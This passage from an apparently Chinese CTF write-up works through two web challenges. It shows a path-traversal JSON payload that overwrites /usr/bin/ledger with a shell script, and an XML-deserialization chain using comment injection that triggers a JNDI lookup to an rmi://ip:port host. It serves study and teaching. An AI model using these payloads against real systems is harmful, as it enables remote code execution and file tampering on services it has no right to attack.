class="string">&quot;File already exists&quot;</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		perm = fileStat.Mode().Perm()</span><br><span class="line">		existingContent, err := os.ReadFile(filePath)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Warn(err)</span><br><span class="line">			<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to read file&quot;</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = os.WriteFile(backupPath, existingContent, perm)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Warn(err)</span><br><span class="line">			<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to create backup&quot;</span>&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = os.WriteFile(filePath, []<span class="type">byte</span>(file.Content), perm)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Warn(err)</span><br><span class="line">		<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Failed to write file&quot;</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Sync(db, SyncRequest&#123;Journal: <span class="literal">true</span>&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> gin.H&#123;<span class="string">&quot;errors&quot;</span>: errors, <span class="string">&quot;saved&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;file&quot;</span>: readLedgerFileWithVersions(dir, filePath)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试利用这个api写文件即可，具体怎么写呢，还是看ai：</p>
<img src="/posts/49264/21.png" class title="awa">
<p>也就是说我们要用json传值，且变量名和<code>LedgerFile</code>结构体内的一致：</p>
<img src="/posts/49264/22.png" class title="awa">
<p>肯定要传<code>name</code>和<code>content</code>的啦：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;../../../../../usr/bin/ledger&quot;, &quot;content&quot;:&quot;#!/bin/sh\nid&quot;&#125;</span><br></pre></td></tr></table></figure>
<img src="/posts/49264/23.png" class title="awa">
<p>啊？这个api不行？那我们找一个相似的：</p>
<img src="/posts/49264/24.png" class title="awa">
<p>这个也是有相似功能的，写进去了：</p>
<img src="/posts/49264/25.png" class title="awa">
<p>访问<code>/api/editor/validate</code>触发</p>
<img src="/posts/49264/26.png" class title="awa">
<img src="/posts/49264/27.png" class title="awa">
<h1><span id="ezlogin"> ezlogin</span></h1>
<p>这个题本人觉得还是挺有意思的，知识盲区，学习了</p>
<p>一个登录的java服务，<code>org.example.UserUtil</code>如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.auth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.FileUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.XmlUtil;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.support.XmlWebApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: ezlogin.jar:BOOT-INF/classes/org/example/auth/UserUtil.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> FileUtil.readString(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/user/AAAAAA.xml&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>).length();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">File</span> <span class="variable">USER_DIR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/user&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">login_in</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSyntax</span><span class="params">(File xmlFile)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">factory</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            factory.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            factory.setNamespaceAware(<span class="literal">false</span>);</span><br><span class="line">            factory.newDocumentBuilder().parse(xmlFile);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;XML syntax error : %s\n&quot;</span>, xmlFile.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">register</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">userFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(USER_DIR, username + XmlWebApplicationContext.DEFAULT_CONFIG_LOCATION_SUFFIX);</span><br><span class="line">        <span class="keyword">if</span> (userFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User already exists!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FileUtil.writeString(MessageFormat.format(<span class="string">&quot;&lt;java&gt;\n    &lt;object class=\&quot;org.example.auth.User\&quot;&gt;\n        &lt;void property=\&quot;username\&quot;&gt;\n            &lt;string&gt;&#123;0&#125;&lt;/string&gt;\n        &lt;/void&gt;\n        &lt;void property=\&quot;password\&quot;&gt;\n            &lt;string&gt;&#123;1&#125;&lt;/string&gt;\n        &lt;/void&gt;\n    &lt;/object&gt;\n&lt;/java&gt;&quot;</span>, username, password), userFile, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register successful!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User <span class="title function_">login</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        User user;</span><br><span class="line">        <span class="type">File</span> <span class="variable">userFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(USER_DIR, username + XmlWebApplicationContext.DEFAULT_CONFIG_LOCATION_SUFFIX);</span><br><span class="line">        <span class="keyword">if</span> (!userFile.exists() || (user = readUser(userFile)) == <span class="literal">null</span> || !user.getPassword().equals(password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        login_in = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> User <span class="title function_">readUser</span><span class="params">(File userFile)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> FileUtil.readString(userFile, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> content.length();</span><br><span class="line">        <span class="keyword">if</span> (checkSyntax(userFile) &amp;&amp; !content.contains(<span class="string">&quot;java.&quot;</span>) &amp;&amp; !content.contains(<span class="string">&quot;springframework.&quot;</span>) &amp;&amp; !content.contains(<span class="string">&quot;hutool.&quot;</span>) &amp;&amp; length &lt;= maxLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> (User) XmlUtil.readObjectFromXml(userFile);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Unusual File Detected : %s\n&quot;</span>, userFile.getName());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">changePassword</span><span class="params">(String username, String oldPass, String newPass)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">userFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(USER_DIR, username + XmlWebApplicationContext.DEFAULT_CONFIG_LOCATION_SUFFIX);</span><br><span class="line">        <span class="keyword">if</span> (!userFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User not exists!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FileUtil.writeString(FileUtil.readString(userFile, <span class="string">&quot;UTF-8&quot;</span>).replace(oldPass, newPass), userFile, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Edit Success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">delUser</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">userFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(USER_DIR, username + XmlWebApplicationContext.DEFAULT_CONFIG_LOCATION_SUFFIX);</span><br><span class="line">        <span class="keyword">if</span> (!userFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User has already been deleted!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtil.del(userFile);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User delete success!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!username.matches(<span class="string">&quot;^[\\x20-\\x7E]&#123;1,6&#125;$&quot;</span>) || !password.matches(<span class="string">&quot;^[\\x20-\\x7E]&#123;3,10&#125;$&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里存在一个xml反序列化，就在<code>readUser()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> User <span class="title function_">readUser</span><span class="params">(File userFile)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> FileUtil.readString(userFile, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> content.length();</span><br><span class="line">        <span class="keyword">if</span> (checkSyntax(userFile) &amp;&amp; !content.contains(<span class="string">&quot;java.&quot;</span>) &amp;&amp; !content.contains(<span class="string">&quot;springframework.&quot;</span>) &amp;&amp; !content.contains(<span class="string">&quot;hutool.&quot;</span>) &amp;&amp; length &lt;= maxLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> (User) XmlUtil.readObjectFromXml(userFile);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Unusual File Detected : %s\n&quot;</span>, userFile.getName());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里做了一个waf，过了waf之后就调用<code>readObjectfromXml</code>进行xml反序列化</p>
<p>思路很简单，怎么控制这个xml能够自由写入，而且要写入什么。而且写入也是有限制的，在register里就给你写好了这个userfile：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">register</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">userFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(USER_DIR, username + XmlWebApplicationContext.DEFAULT_CONFIG_LOCATION_SUFFIX);</span><br><span class="line">        <span class="keyword">if</span> (userFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User already exists!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FileUtil.writeString(MessageFormat.format(<span class="string">&quot;&lt;java&gt;\n    &lt;object class=\&quot;org.example.auth.User\&quot;&gt;\n        &lt;void property=\&quot;username\&quot;&gt;\n            &lt;string&gt;&#123;0&#125;&lt;/string&gt;\n        &lt;/void&gt;\n        &lt;void property=\&quot;password\&quot;&gt;\n            &lt;string&gt;&#123;1&#125;&lt;/string&gt;\n        &lt;/void&gt;\n    &lt;/object&gt;\n&lt;/java&gt;&quot;</span>, username, password), userFile, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register successful!&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>能写入的只有<code>username</code>和<code>password</code>，而且<code>username</code>和<code>password</code>写入的长度十分有限，分别只有最多6位和最多10位</p>
<p>题目提示：</p>
<blockquote>
<p>逻辑漏洞 &lt;!–</p>
</blockquote>
<p>这个提示是<code>&lt;!--</code>是xml的注释符，那题目就是提示我们去找能够注释掉的地方，而且不是注册接口，因为注册的地方不允许我们写入太长的payload。几个<code>controller</code>只剩<code>deleteController</code>和<code>editController</code>没看了，<code>RegistryController</code>我们说了没啥用，<code>LoginController</code>是正常的</p>
<p>delUser的调用也没有什么问题，没有涉及到文件的写，而是直接删除了这个文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">delUser</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">userFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(USER_DIR, username + XmlWebApplicationContext.DEFAULT_CONFIG_LOCATION_SUFFIX);</span><br><span class="line">        <span class="keyword">if</span> (!userFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User has already been deleted!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtil.del(userFile);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User delete success!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">del</span><span class="params">(File file)</span> <span class="keyword">throws</span> IORuntimeException &#123;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || <span class="literal">false</span> == file.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (file.isDirectory() &amp;&amp; <span class="literal">false</span> == clean(file)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> file.toPath();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            delFile(path);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (DirectoryNotEmptyException e) &#123;</span><br><span class="line">            del(path);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IORuntimeException</span>(e2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那就只有edit了，而edit里只有修改密码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EditController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(value = &#123;&quot;/editPass&quot;&#125;, consumes = &#123;MediaType.APPLICATION_FORM_URLENCODED_VALUE&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">edit</span><span class="params">(<span class="meta">@RequestParam</span> String newPass, HttpSession session)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;loggedInUser&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No user logged in!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!UserUtil.check(user.getUsername(), newPass)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid input ! Password length should be between 3-10 and it should be printable English chars!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        UserUtil.changePassword(user.getUsername(), user.getPassword(), newPass);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Edit success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/editPass&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showEditPage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;edit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到他从我们的<code>session</code>里获取了我们的信息，再根据这个session里的信息去获取到的username password。</p>
<p>也就是说<strong>调用changepassword</strong>的时候其实是获取到了我们session里的信息再用这个信息去改的</p>
<p>而修改的时候是直接将xml里的<code>oldpass</code>给replace成<code>newpass</code></p>
<p>那这里就有漏洞了，<strong>如果session不变的话</strong>，我就可以限制<code>oldpass</code>为<code>xxx</code>，此时newpass为<code>aaaxxx</code>，这样<code>replace</code>后文件就会变成<code>aaaxxx</code>，但是<code>oldpass</code>还是<code>xxx</code>，下一次newpass变成<code>bbbxxx</code>，这样子，下一次重置就变成了<code>aaabbbxxx</code>，这样一直写下去就可以了</p>
<p>而且可以很明显的发现session是不变的，无论是edit还是del都不会对session有影响。而且这也有一个好处，我这样还可以对同一个user的xml进行不断的修改，流程就是不断地注册同名用户，然后获取到session后就可以删除。</p>
<p>还有个问题就是写啥？</p>
<p>这是一个spring服务，所以肯定有jackson，我们还不能够直接传payload进去，因为payload太长了(个人认为)，这题目还有长度的限制。要想缩短长度得用jrmp的思路</p>
<p>也就是：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;lookup&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>rmi://ip:port/a<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>AAAAAA.xml：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;org.example.auth.User&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>AAAAAA<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>AAAAAAAAAA<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>而写入的文件就跟这个<code>AAAAAA.xml</code>几乎一致，这意味着我们要利用刚刚那个方法去改xml，我们还得把它改短：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;org.example.auth.User&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>AAAAAA<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/<span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;lookup&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>rmi://ip:port/a<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span>/<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以<code>/ /</code>为分界线，分界线里面是我们需要的，其他的是我们需要注释掉的或者需要换掉以缩短长度的，而<code>/ /就可以替换为--&gt;和&lt;!--</code>进行注释。真正要写入的内容变为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;&lt;java&gt;&lt;object class=&quot;javax.naming.InitialContext&quot;&gt;&lt;void method=&quot;lookup&quot;&gt;&lt;string&gt;rmi://ip:port/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--</span><br></pre></td></tr></table></figure>
<p>我们可以通过下面的方式去注释：</p>
<ul>
<li>注册关键词用户，获取他们的session，将其修改为最短的<code>111</code>(密码最短3位)</li>
